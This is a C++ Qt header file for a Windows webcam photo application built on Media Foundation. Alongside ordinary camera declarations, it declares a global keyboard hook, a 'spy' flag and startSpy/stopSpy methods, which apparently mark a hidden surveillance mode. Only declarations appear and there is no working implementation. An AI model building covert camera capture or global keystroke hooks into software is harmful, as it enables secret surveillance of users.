#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#include <QMainWindow>
#include "timedialog.h"
#include <windows.h>
#include <mfidl.h>
#include <mfapi.h>
#include <mfobjects.h>
#include <mfreadwrite.h>
#include <mferror.h>
#include <QFileDialog>
#include <QDebug>
#include <QDateTime>
#include <QTimer>
#include <initguid.h>
DEFINE_GUID(KSCATEGORY_CAMERA, 0xE5323777, 0xF976, 0x4F5B, 0x9B, 0x55, 0xB9, 0x46, 0x99, 0xC4, 0x6E, 0x44);
DEFINE_GUID(KSCATEGORY_CAPTURE, 0x65E8773D, 0x8F56, 0x11D0, 0xA3, 0xB9, 0x00, 0xA0, 0xC9, 0x22, 0x31, 0x96);

extern bool spy;
extern HHOOK hHook;
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

QT_BEGIN_NAMESPACE
namespace Ui {
class MainWindow;
}
QT_END_NAMESPACE

class MainWindow : public QMainWindow
{
    Q_OBJECT

    Ui::MainWindow *ui;
    IMFMediaSource* device;
    IMFSourceReader* reader;

    void fillData(IMFActivate* activator);
    void initReader(bool fill);
    void startSpy();

public:
    MainWindow(QWidget *parent = nullptr);
    ~MainWindow();
    void takePhoto(const QString& path);
    void stopSpy();

private slots:
    void onPhotoButtonClicked();

};
#endif // MAINWINDOW_H
